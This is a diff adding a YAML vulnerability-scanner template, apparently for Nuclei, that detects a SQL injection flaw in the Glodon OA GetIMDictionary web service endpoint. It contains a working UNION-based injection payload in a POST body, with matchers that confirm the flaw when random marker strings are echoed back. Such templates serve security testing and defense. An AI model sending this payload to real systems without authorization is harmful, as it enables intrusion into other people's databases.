@@ -1,0 +1,28 @@
+id: glodon-getimdictionary-sqli
+info:
+  name: 广联达 getimdictionary 接口 - SQL 注入漏洞
+  author: EASY
+  severity: high
+  reference:
+    - https://github.com/Ershu1/2023_Hvv/blob/d851d9282979c313b7dcfcd05da2c09348c67669/%E5%B9%BF%E8%81%94%E8%BE%BEoa%20%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: glodon
+    product: oa
+  tags: sqli,vuln,glodon,oa
+variables:
+  s1: '{{to_lower(rand_text_alpha(20))}}'
+  s2: '{{to_lower(rand_text_alpha(20))}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
+    redirects: true
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: dasdas=&key=1' UNION ALL SELECT concat('{{s1}}','{{s2}}') --
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "<?xml") && contains(body, concat(s1, s2)) && contains(body, "result  value=")'
